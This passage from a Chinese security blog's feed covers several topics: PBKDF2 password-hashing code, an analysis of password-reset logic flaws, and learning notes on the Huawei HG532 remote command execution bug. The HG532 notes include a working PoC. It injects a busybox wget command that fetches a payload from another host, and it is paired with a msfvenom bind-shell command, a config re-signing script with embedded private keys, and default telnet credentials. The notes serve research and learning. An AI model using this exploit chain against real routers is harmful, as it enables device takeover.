        <span class="comment">/// &lt;param name="a"&gt;The first byte array.&lt;/param&gt;</span>
        <span class="comment">/// &lt;param name="b"&gt;The second byte array.&lt;/param&gt;</span>
        <span class="comment">/// &lt;returns&gt;True if both byte arrays are equal. False otherwise.&lt;/returns&gt;</span>
        <span class="keyword">private</span> <span class="keyword">static</span> bool SlowEquals(<span class="built_in">byte</span>[] a, <span class="built_in">byte</span>[] b)
        {
            uint diff = (uint)a.Length ^ (uint)b.Length;
            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; a.Length &amp;&amp; i &lt; b.Length; i++)
                diff |= (uint)(a[i] ^ b[i]);
            <span class="keyword">return</span> diff == <span class="number">0</span>;
        }

        <span class="comment">/// &lt;summary&gt;</span>
        <span class="comment">/// Computes the PBKDF2-SHA1 hash of a password.</span>
        <span class="comment">/// &lt;/summary&gt;</span>
        <span class="comment">/// &lt;param name="password"&gt;The password to hash.&lt;/param&gt;</span>
        <span class="comment">/// &lt;param name="salt"&gt;The salt.&lt;/param&gt;</span>
        <span class="comment">/// &lt;param name="iterations"&gt;The PBKDF2 iteration count.&lt;/param&gt;</span>
        <span class="comment">/// &lt;param name="outputBytes"&gt;The length of the hash to generate, in bytes.&lt;/param&gt;</span>
        <span class="comment">/// &lt;returns&gt;A hash of the password.&lt;/returns&gt;</span>
        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] PBKDF2(string password, <span class="built_in">byte</span>[] salt, <span class="built_in">int</span> iterations, <span class="built_in">int</span> outputBytes)
        {
            Rfc2898DeriveBytes pbkdf2 = <span class="keyword">new</span> Rfc2898DeriveBytes(password, salt);
            pbkdf2.IterationCount = iterations;
            <span class="keyword">return</span> pbkdf2.GetBytes(outputBytes);
        }
    }
}
Ruby (on Rails) 密码hash代码
代码下载

# Password Hashing With PBKDF2 (http:<span class="comment">//crackstation.net/hashing-security.htm).</span>
# Copyright (c) <span class="number">2013</span>, Taylor Hornby
# All rights reserved.
# 
# Redistribution and use in source and <span class="built_in">binary</span> forms, with or without 
# modification, are permitted provided that the following conditions are met:
# 
# <span class="number">1.</span> Redistributions of source code must retain the above copyright notice, 
# <span class="keyword">this</span> list of conditions and the following disclaimer.
# 
# <span class="number">2.</span> Redistributions in <span class="built_in">binary</span> form must reproduce the above copyright notice,
# <span class="keyword">this</span> list of conditions and the following disclaimer in the documentation 
# and/or other materials provided with the distribution.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS <span class="string">"AS IS"</span> 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
# POSSIBILITY OF SUCH DAMAGE.

require <span class="string">'securerandom'</span>
require <span class="string">'openssl'</span>
require <span class="string">'base64'</span>

# Salted password hashing with PBKDF2-SHA1.
# Authors: @RedragonX (dicesoft.net), havoc AT defuse.ca 
# www: http:<span class="comment">//crackstation.net/hashing-security.htm</span>
module PasswordHash

  # The following constants can be changed without breaking existing hashes.
  PBKDF2_ITERATIONS = <span class="number">1000</span>
  SALT_BYTE_SIZE = <span class="number">24</span>
  HASH_BYTE_SIZE = <span class="number">24</span>

  HASH_SECTIONS = <span class="number">4</span>
  SECTION_DELIMITER = <span class="string">':'</span>
  ITERATIONS_INDEX = <span class="number">1</span>
  SALT_INDEX = <span class="number">2</span>
  HASH_INDEX = <span class="number">3</span>

  # Returns a salted PBKDF2 hash of the password.
  def self.createHash( password )
    salt = SecureRandom.base64( SALT_BYTE_SIZE )
    pbkdf2 = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      salt,
      PBKDF2_ITERATIONS,
      HASH_BYTE_SIZE
    )
    <span class="keyword">return</span> [<span class="string">"sha1"</span>, PBKDF2_ITERATIONS, salt, Base64.encode64( pbkdf2 )].<span class="built_in">join</span>( SECTION_DELIMITER )
  end

  # Checks <span class="keyword">if</span> a password is correct given a hash of the correct one.
  # correctHash must be a hash string generated with createHash.
  def self.validatePassword( password, correctHash )
    params = correctHash.<span class="built_in">split</span>( SECTION_DELIMITER )
    <span class="keyword">return</span> <span class="keyword">false</span> <span class="keyword">if</span> params.length != HASH_SECTIONS

    pbkdf2 = Base64.decode64( params[HASH_INDEX] )
    testHash = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      params[SALT_INDEX],
      params[ITERATIONS_INDEX].to_i,
      pbkdf2.length
    )

    <span class="keyword">return</span> pbkdf2 == testHash
  end

  # Run tests to ensure the module is functioning properly.
  # Returns <span class="keyword">true</span> <span class="keyword">if</span> all tests succeed, <span class="keyword">false</span> <span class="keyword">if</span> not.
  def self.runSelfTests
    puts <span class="string">"Sample hashes:"</span>
    <span class="number">3.</span>times { puts createHash(<span class="string">"password"</span>) }

    puts <span class="string">"\nRunning self tests..."</span>
    @@allPass = <span class="keyword">true</span>

    correctPassword = <span class="string">'aaaaaaaaaa'</span>
    wrongPassword = <span class="string">'aaaaaaaaab'</span>
    hash = createHash(correctPassword)

    <span class="keyword">assert</span>( validatePassword( correctPassword, hash ) == <span class="keyword">true</span>, <span class="string">"correct password"</span> )
    <span class="keyword">assert</span>( validatePassword( wrongPassword, hash ) == <span class="keyword">false</span>, <span class="string">"wrong password"</span> )

    h1 = hash.<span class="built_in">split</span>( SECTION_DELIMITER )
    h2 = createHash( correctPassword ).<span class="built_in">split</span>( SECTION_DELIMITER )
    <span class="keyword">assert</span>( h1[HASH_INDEX] != h2[HASH_INDEX], <span class="string">"different hashes"</span> )
    <span class="keyword">assert</span>( h1[SALT_INDEX] != h2[SALT_INDEX], <span class="string">"different salt"</span> )

    <span class="keyword">if</span> @@allPass
      puts <span class="string">"*** ALL TESTS PASS ***"</span>
    <span class="keyword">else</span>
      puts <span class="string">"*** FAILURES ***"</span>
    end

    <span class="keyword">return</span> @@allPass
  end

  def self.<span class="keyword">assert</span>( truth, msg )
    <span class="keyword">if</span> truth
      puts <span class="string">"PASS [#{msg}]"</span>
    <span class="keyword">else</span>
      puts <span class="string">"FAIL [#{msg}]"</span>
      @@allPass = <span class="keyword">false</span>
    end
  end

end

PasswordHash.runSelfTests
</code></pre><p>[via crackstation.net   翻译整理by litdg@freebuf]</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;更新：&quot;&gt;更新：&lt;/h2&gt;&lt;p&gt;文章是14年翻译的，发在了freebuf和乌云drops上，最近重新看了一下，记录一下思考。总体来说感觉翻译的流畅度还是可以的，那会没有用谷歌翻译，记得翻译了一个星期，很是痛苦。文章比较长，所以顺便写个总结和微博上的一些评论的讨论。
    
    </summary>
    
      <category term="加密解密" scheme="http://xdxd.love/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>逻辑漏洞之找回密码</title>
    <link href="http://xdxd.love/2018/02/25/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81/"/>
    <id>http://xdxd.love/2018/02/25/逻辑漏洞之找回密码/</id>
    <published>2018-02-25T06:01:03.000Z</published>
    <updated>2018-02-25T07:24:02.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="更新记录：">更新记录：</h1><p>2015-06-11 14:01:03</p>
<h1 id="更新内容：">更新内容：</h1><p>通过对大量案例进行分析，可以总结出容易出现问题的可以归纳为两种。一是临时密码的设计和保护出现问题，位数太少可以爆破，算法泄露，返回到了客户端。二是把客户端发送的数据作为了后端逻辑的依据，主要是发送验证码到客户端提供的手机上，根据客户端提供的UID修改对应的密码，导致了平行权限的漏洞。</p>
<p>毫无疑问，找回密码这个功能是一个很容易出现漏洞的功能。乌云知识库已经有4篇文章介绍找回密码的测试方式。总的来说，姿势很多。所以这里想从找回密码功能设计的角度分析一下，怎么设计一个安全的找回密码功能。当进行安全测试的时候，需要从哪几个角度去考虑可能出现的问题。目的是尝试在一个统一的模型里归纳找回密码功能的安全问题。</p>
<h1 id="逻辑本质">逻辑本质</h1><p>目前的用户体系里，依然是采用用户名和密码的方式来进行用户认证的。用户忘记了密码也是一个十分常见的场景。所以需要给用户提供一个忘记密码的场景下重新获得账号控制权的方式。所以这个功能设计的一个场景其实是一个用户并不拥有某个账号的密码，他需要通过某些途径向系统证明他是这个账号的所有者。反过来我们在设计找回密码功能的时候，是提供一个认证用户的途径。正常情况下，是通过密码来认证用户的。找回密码的情况是在没有密码的基础上正确认证用户。</p>
<p>常见的方式有回答预设的问题，通过手机发送验证码，通过邮件发送链接或者验证码等。这样设计的一个基础是账户的拥有者虽然忘记了密码，但是该账户的拥有者具备一些其他人不具备的属性，比如知道之前拥有者自己设置的保护问题的答案，类似于我的爸爸叫什么，小学哪里上的之类，比如拥有该账户关联的手机和邮箱的所有权。显然密保问题的答案虽然相对私密，但是依赖于具体的问题。有些问题的答案也许通过社工就可以获得。所以一般找回密码功能都是基于账号拥有者具备该账户关联的手机和邮箱的所有权进行设计的。</p>
<h1 id="验证流程">验证流程</h1><p>通过上面的分析，找回密码的逻辑可以转化为如何识别某一个用户是某个手机或者邮箱的拥有者。常见的手段是服务端给手机(邮箱)发送一个验证码或者链接，用户正确输入验证码或者点击链接就认为是手机(邮箱)的拥有者，给他恢复与该手机(邮箱)关联的用户权限。验证码和链接的作用相当于临时密码。所以整个找回密码的核心流程如下:</p>
<p><img src="/images/zhaohuimima1.png" alt=""></p>
<p>最简单的情况下，客户端只需要发送2次请求就可以找回密码，流程越少越安全。但是目前大部分厂商依然使用了3步请求来完成重置密码的操作。可能是为了用户体验的考虑，一般都加了一步临时密码的验证。下面是概括的一个安全的找回密码设计方案。目前大部分厂商的找回密码流程可以看做是下面流程的子集。<br><img src="/images/zhaohuimima2.png" alt=""></p>
<h1 id="漏洞挖掘">漏洞挖掘</h1><p>CSRF，SQL注入，越权修改密码，越权绑定邮箱等等漏洞也会导致修改任意用户密码。这里只讨论找回密码流程设计实现上出现的问题。通过对大量案例进行分析，可以总结出容易出现问题的可以归纳为两种。一是临时密码的设计和保护出现问题，位数太少可以爆破，算法泄露，返回到了客户端。二是把客户端发送的数据作为了后端逻辑的依据，主要是发送验证码到客户端提供的手机上，根据客户端提供的UID修改对应的密码，导致了平行权限的漏洞。实际上找回密码这个场景，需要客户端的数据之后一个就是需要找回密码的账户的ID。其他的数据都应该从后台查而不是从客户端获取。此外还有一种特殊点的情况，使用session作为用户身份的识别。这种情况一般出现相对大一些的网站比如聚美优品和易付宝，在这个功能开发中有了一定的多步骤业务逻辑的设计，可惜没有设计完美。在整个找回密码过程中，通过session识别用户。但是没有考虑到。第一步进行session绑定的时候，session对应的用户是可以伪造的。本质上是把客户端发送的数据作为了后端逻辑的依据。这个测试的时候基本就两种情况。一是在验证临时密码的时候伪造session对应的用户，再一个是在修改密码的环节伪造session。</p>
<h1 id="微信的案例">微信的案例</h1><p><a href="http://www.wooyun.org/bugs/wooyun-2010-011720" target="_blank" rel="external">微信任意用户密码修改漏洞</a><br><img src="/images/zhaohuimima3.png" alt=""><br>微信的这个问题，表面上是对验证次数的限制被绕过导致的。扯远一点，这个绕过挺有意思的。它是对数据进行了清洗，然后传入了后面的逻辑。从安全设计上来说，最完全的做法是对数据进行检查，如果发现非法数据就阻断请求，而不是清洗之后进入后续逻辑。从找回密码功能来说，采用了 4-5位的小空间的随机数做临时密码是导致这个漏洞出现的根源。</p>
<h1 id="360的案例">360的案例</h1><p><a href="http://www.wooyun.org/bugs/wooyun-2012-08333" target="_blank" rel="external">奇虎360任意用户密码修改漏洞</a><br><img src="/images/zhaohuimima4.png" alt=""></p>
<pre><code>重设密码地址：<span class="link_url">http://i.360.cn/findpwd/setpwdfromemail?vc=c4ce4dd3d566ef83f9</span>[<span class="link_label">马赛克</span>]&amp;u=[马赛克]%40gmail.com,马上重设密码！
</code></pre><p>这个案例中是由于生成临时密码的算法被破解。从32位字母数字推断出是时间戳md5。临时密码泄露也就导致了整个找回密码功能的用户识别机制失效。其实这种类型的漏洞，<a href="http://www.wooyun.org/bugs/wooyun-2013-046999" target="_blank" rel="external">当当网的例子更加经典</a>,采用了手机号加验证码md5取前10位，都被猜出来了。</p>
<h1 id="易付宝的案例">易付宝的案例</h1><p>易付宝这个案例就是上面说过的</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0120853" target="_blank" rel="external">苏宁易付宝任意重置密码登入</a><br><img src="/images/zhaohuimima5.png" alt=""></p>
<p>这个案例虽然没有公开，但是重置密码就是上面说过的几个分析角度。最复杂的情况就是通过session识别用户而已。这里就是最后修改密码的环节，采用了session对应的用户作为被修改的对象。但是绑定session是在第一步的时候做的。可以伪造。造成了任意用户密码修改。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;更新记录：&quot;&gt;更新记录：&lt;/h1&gt;&lt;p&gt;2015-06-11 14:01:03&lt;/p&gt;
&lt;h1 id=&quot;更新内容：&quot;&gt;更新内容：&lt;/h1&gt;&lt;p&gt;通过对大量案例进行分析，可以总结出容易出现问题的可以归纳为两种。一是临时密码的设计和保护出现问题，位数太少可以爆破，算法
    
    </summary>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="逻辑漏洞" scheme="http://xdxd.love/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>华为HG532远程命令执行漏洞 学习笔记</title>
    <link href="http://xdxd.love/2018/02/10/%E5%8D%8E%E4%B8%BAHG532%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://xdxd.love/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/</id>
    <published>2018-02-10T08:15:07.000Z</published>
    <updated>2018-02-10T08:18:44.892Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理">漏洞原理</h2><p>参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。</p>
<p><img src="/images/hg5321.png" alt=""></p>
<h2 id="poc">poc</h2><pre><code><span class="xml">import requests

headers = </span><span class="expression">{
    <span class="string">"Authorization"</span>: <span class="string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span>
}</span><span class="xml">

data = '''<span class="pi">&lt;?xml version="1.0" ?&gt;</span>
 <span class="tag">&lt;<span class="title">s:Envelope</span> <span class="attribute">xmlns:s</span>=<span class="value">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attribute">s:encodingStyle</span>=<span class="value">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">s:Body</span>&gt;</span><span class="tag">&lt;<span class="title">u:Upgrade</span> <span class="attribute">xmlns:u</span>=<span class="value">"urn:schemas-upnp-org:service:WANPPPConnection:1"</span>&gt;</span>
   <span class="tag">&lt;<span class="title">NewStatusURL</span>&gt;</span>;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;<span class="tag">&lt;/<span class="title">NewStatusURL</span>&gt;</span>
   <span class="tag">&lt;<span class="title">NewDownloadURL</span>&gt;</span>HUAWEIUPNP<span class="tag">&lt;/<span class="title">NewDownloadURL</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">u:Upgrade</span>&gt;</span>
 <span class="tag">&lt;/<span class="title">s:Body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">s:Envelope</span>&gt;</span>
'''
requests.post('http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)</span>
</code></pre><h2 id="shell获取">shell获取</h2><p>使用msfvenom生成payload。 </p>
<pre><code><span class="comment">msfvenom</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">format</span> <span class="comment">elf</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">arch</span> <span class="comment">mipsbe</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">platform</span> <span class="comment">linux</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">payload</span> <span class="comment">linux/mipsbe/shell_bind_tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">out</span> <span class="comment">payload</span><span class="string">.</span><span class="comment">elf</span> 
</code></pre><p><img src="/images/hg5322.png" alt=""></p>
<p>修改poc，下载payload执行可以获得shell。</p>
<p><img src="/images/hg5323.png" alt=""></p>
<h2 id="动态调试">动态调试</h2><p><img src="/images/hg5324.png" alt=""></p>
<h2 id="开启telent">开启telent</h2><p>该款路由器默认不开启telent。可以通过修改配置文件的方式开启telent。先下载配置文件，配置文件是加密的。使用一下脚本解密。脚本为网上开源。</p>
<pre><code><span class="comment">#!/usr/bin/python</span>
<span class="keyword">import</span> sys
<span class="keyword">import</span> os
<span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify
<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
<span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256
<span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number


RSA_D = <span class="string">"1B18D0048611500CA489C51D7389B19A"</span> \
    <span class="string">"F977E6F5BB8DD5E61A62E339499E6237"</span> \
    <span class="string">"C234740129EBD25EF226AB7E498A0830"</span> \
    <span class="string">"DF0A5D45F19F5055B906EBC5E71C16C5"</span> \
    <span class="string">"A99E36D4F369701FAE2403E445BA3CAE"</span> \
    <span class="string">"4B0C9526A82EDD90FECD78B7EDD5EA5E"</span> \
    <span class="string">"6C98A0C4CABF3148E99E78DA0D5EB972"</span> \
    <span class="string">"6F1533A6738F47C790037D532F403C0D"</span>

RSA_N = <span class="string">"A93591A1BFCB7615555C12CFE3AF0B68"</span> \
    <span class="string">"5A6B94E8604A9441ABF7A5F268D4CBF9"</span> \
    <span class="string">"6022E2F0694D679D2C8E4C2D4C3C0C44"</span> \
    <span class="string">"60C5646E852A51EF7EBC2F0C88F08E80"</span> \
    <span class="string">"6D991446348EB7AF280E607DDA363F4F"</span> \
    <span class="string">"322E9B5005503F31F60353219F86443A"</span> \
    <span class="string">"04E573FFEF541D21ADD1043E478D81B1"</span> \
    <span class="string">"E79A5B434C5F64B3D5B141D7BEB59D71"</span>

RSA_E = <span class="string">"010001"</span>

SIG_TEMPLATE = <span class="string">"0001FFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
               <span class="string">"003021300906052B0E03021A05000420"</span>

AES128CBC_KEY = <span class="string">"3E4F5612EF64305955D543B0AE350880"</span>
AES128CBC_IV = <span class="string">"8049E91025A6B54876C3B4868090D3FC"</span>

XML_VERSION_STRING = <span class="string">b'&lt;?xml version="1.0" ?&gt;'</span>

<span class="function"><span class="keyword">def</span> <span class="title">print_usage</span><span class="params">()</span>:</span>
    print(<span class="string">"Usage : "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" {encrypt | decrypt} input_file output_file"</span>)
    sys.exit(<span class="number">1</span>)

<span class="function"><span class="keyword">def</span> <span class="title">load_config</span><span class="params">(config_file)</span>:</span>
    <span class="keyword">if</span> os.path.isfile(config_file):
        cf = open(config_file, <span class="string">"rb"</span>)
        config = cf.read()
        cf.close()
    <span class="keyword">else</span>:
        print(<span class="string">"Config file not found..exiting"</span>)
        sys.exit(<span class="number">1</span>)
    <span class="keyword">return</span> config

<span class="function"><span class="keyword">def</span> <span class="title">save_to_file</span><span class="params">(dest_file, data)</span>:</span>
    wfile = open(dest_file,<span class="string">"wb"</span>)
    wfile.write(data)
    wfile.close()

<span class="function"><span class="keyword">def</span> <span class="title">get_sha256_hash_from_sig</span><span class="params">(sig)</span>:</span>
    sig_int = int(hexlify(sig),<span class="number">16</span>)
    rsa_n = int(RSA_N,<span class="number">16</span>)
    dec_sig_as_int = pow(sig_int, <span class="number">0x10001</span>, rsa_n );
    decrypted_sig = number.long_to_bytes(dec_sig_as_int, <span class="number">128</span>)
    target_sha256 = hexlify(decrypted_sig)[-<span class="number">64</span>:]
    <span class="keyword">return</span> target_sha256

<span class="function"><span class="keyword">def</span> <span class="title">calc_actual_sha256_hash</span><span class="params">(enc_config_body)</span>:</span>
    sha256 = SHA256.new()
    sha256.update(enc_config_body)
    actual_sha256_sig = sha256.hexdigest()
    actual_sha256_sig = str.encode(actual_sha256_sig)
    <span class="keyword">return</span> actual_sha256_sig

<span class="function"><span class="keyword">def</span> <span class="title">decrypt_body</span><span class="params">(enc_config_body)</span>:</span>
    iv = unhexlify(AES128CBC_IV)
    key= unhexlify(AES128CBC_KEY)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(enc_config_body)
    <span class="comment"># Strip block padding</span>
    decrypted_data=decrypted_data.rstrip(<span class="string">b'\0'</span>)
    <span class="keyword">return</span> decrypted_data


<span class="function"><span class="keyword">def</span> <span class="title">decrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
    enc_config=load_config(input_file)
    sig = enc_config[:<span class="number">0x80</span>]
    enc_config_body=enc_config[<span class="number">0x80</span>:]

    print(<span class="string">"verifying signature..."</span>)
    target_sha256_hash = get_sha256_hash_from_sig(sig)
    actual_sha256_hash = calc_actual_sha256_hash(enc_config_body)

    <span class="keyword">if</span> (actual_sha256_hash == target_sha256_hash):
        print(<span class="string">"Signature ok..."</span>)
    <span class="keyword">else</span>:
        print(<span class="string">"Signature not ok...exiting"</span>)
        sys.exit(<span class="number">1</span>)

    print(<span class="string">"Decrypting..."</span>)
    decrypted_data = decrypt_body(enc_config_body)

    <span class="comment">#check_config(decrypted_data)</span>

    print(<span class="string">"Saving decrypted config to "</span> + output_file + <span class="string">"..."</span>)
    save_to_file(output_file, decrypted_data)

<span class="comment">#def check_config(new_config_file):</span>
<span class="comment">#    head = new_config_file[0:len(XML_VERSION_STRING)]</span>
<span class="comment">#    if head != XML_VERSION_STRING:</span>
<span class="comment">#        print("Not a valid config file...exiting")</span>
<span class="comment">#        sys.exit(1)</span>

<span class="function"><span class="keyword">def</span> <span class="title">encrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
    new_config_file=load_config(input_file)

    <span class="comment">#check_config(new_config_file)</span>

    padding_amount = len(new_config_file) % <span class="number">32</span>
    print(<span class="string">""</span> + str(padding_amount) + <span class="string">" bytes padding needed"</span>)
    print(<span class="string">"Adding padding..."</span>)
    new_config_file=new_config_file + <span class="string">b'\0'</span>*(<span class="number">32</span>-padding_amount)

    print(<span class="string">"Encrypting config..."</span>)
    iv = unhexlify(AES128CBC_IV)
    key= unhexlify(AES128CBC_KEY)
    aes = AES.new(key, AES.MODE_CBC, iv)
    enc_new_config = aes.encrypt(new_config_file)

    print(<span class="string">"Calculating SHA256 hash..."</span>)
    h = SHA256.new()
    h.update(enc_new_config)
    actual_sha256_sig = h.hexdigest()

    sig = SIG_TEMPLATE+actual_sha256_sig;

    print(<span class="string">"Encrypting Signature..."</span>)
    sig_int = int(sig,<span class="number">16</span>)
    rsa_d = int(RSA_D,<span class="number">16</span>)
    rsa_n = int(RSA_N,<span class="number">16</span>)
    enc_sig_int = pow(sig_int, rsa_d, rsa_n);

    encrypted_sig = number.long_to_bytes(enc_sig_int, <span class="number">128</span>)
    enc_config = encrypted_sig + enc_new_config

    print(<span class="string">"Saving encrypted config to "</span> + output_file + <span class="string">"..."</span>)
    save_to_file(output_file, enc_config)

<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>

    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:
        print_usage()

    input_file = sys.argv[<span class="number">2</span>]
    output_file = sys.argv[<span class="number">3</span>]
    command = sys.argv[<span class="number">1</span>]

    <span class="keyword">if</span> (command == <span class="string">"encrypt"</span>):
        encrypt_config(input_file, output_file)
    <span class="keyword">elif</span> (command == <span class="string">"decrypt"</span>):
        decrypt_config(input_file, output_file)
    <span class="keyword">else</span>:
        print_usage()



<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    main()
</code></pre><p>修改配置文件之后，可能还需要修改防火墙策略，才可以连上telnet端口。</p>
<p>telnet的用户名和密码为：!!Huawei          @HuaweiHgw<br>连上之后为一个自定义的shell，无法执行正常的shell命令。网上查到输入 welcome to shell可以获得正常shell。但是输入之后无任何信息返回，虽然没有获得shell，但是跟其他命令还是有区别。其他字符会返回command failed。<br><img src="/images/hg5325.png" alt=""></p>
<h2 id="修复方案">修复方案</h2><p>其他华为官网上的新版本固件就不存在这个漏洞了。应该是重构了，大部分逻辑都改了。所以这个漏洞其实是不影响最新版的固件的。只是一个比较老的版本存在的问题。</p>
<p><img src="/images/hg5326.png" alt=""></p>
<h2 id="其他分析资料学习与反思">其他分析资料学习与反思</h2><p><a href="http://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/" target="_blank" rel="external">对华为HG532远程命令执行漏洞的新探索</a>中有两个新的点，一个是利用csrf实现漏洞利用。将用户名和密码放在url中完成认证，http:// dslf-config:admin @routerip:37215。这个方式在之前13年传播比较广的利用csrf修改dns的利用中就是这么实现的。再一个是利用DNS rebind技术绕过限制，获得自己需要的一些http header。</p>
<p><a href="https://slab.qq.com/news/tech/1705.html" target="_blank" rel="external">腾讯蜜罐系统捕获高危IoT蠕虫Okiru</a> 文中也有对该漏洞的简要分析。文中提到利用0x22字符，试图对认证字符进行截断。我觉得这个推测应该是不正确，后文也并没有其他的依据可以证明这个推断。0x22就是http协议需要和xml协议中需要的双引号。没有绕过认证的作用。<br><img src="/images/hg5327.png" alt=""></p>
<h2 id="参考资料">参考资料</h2><p><a href="https://paper.seebug.org/490/" target="_blank" rel="external">https://paper.seebug.org/490/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞原理&quot;&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/hg5321.png&quot; alt=
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>安全圈怪现状读后感</title>
    <link href="http://xdxd.love/2018/02/02/%E5%AE%89%E5%85%A8%E5%9C%88%E6%80%AA%E7%8E%B0%E7%8A%B6%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    <id>http://xdxd.love/2018/02/02/安全圈怪现状读后感/</id>
    <published>2018-02-02T07:10:32.000Z</published>
    <updated>2018-02-02T07:11:19.079Z</updated>
    
    <content type="html"><![CDATA[<p>总的来说是了解到两个新的观念，一个是iot的设备应该更多考虑eip的控制权，其他场景需要考虑数据的控制权，保护数据的控制权并不一定等同于保护相关系统的eip控制权。再一个是反反向能力和正向能力的概念。</p>
<h2 id="重视攻，轻视防">重视攻，轻视防</h2><p>我的理解是企业轻视防，才导致了目前的现状。安全技术的从业人员多是兴趣导向，从而导致攻的人员占多，而企业轻视防，导致防的安全人员比例没有提升上来。随着时间发展，防的人会更多，占比自然也会提升。并不一定是做攻的人太多了，需要一部分转去做防。而是环境导致做防的人太少了，从而导致了目前攻防人员的比例失衡。</p>
<p>最近几年也会看到有些甲方的安全建设的分享，这种分享虽然跟攻的技术分享比还是太少。但是总体来说绝对量上是越来越多的。也说明了防的这一方也是快速增长的。</p>
<p>后面的重视单点破坏，轻视体系建设，重视技术，轻视业务，我觉得都是现状，而且随着企业更重视安全做体系建设和业务安全的人和公司会越来越多。现在已经有不少做业务安全的乙方公司，也有一些乙方公司有安全体系建设相关的产品了。</p>
<h2 id="重视攻防，轻视数据">重视攻防，轻视数据</h2><p>这个观点还是让我非常震惊，虽然我们都知道我们要保护的核心资产是数据，但是很多精力都是放在权限上。默认拿到权限都可以拿到数据，这可能是因为以前的渗透的经历导致的，我们大多看到的系统都是简单的，有了权限，就有了数据。从来没有思考过，有没有可能在某些架构下，即使给你权限，你也拿不到数据。所以这是一个非常好的问题。值得深思。</p>
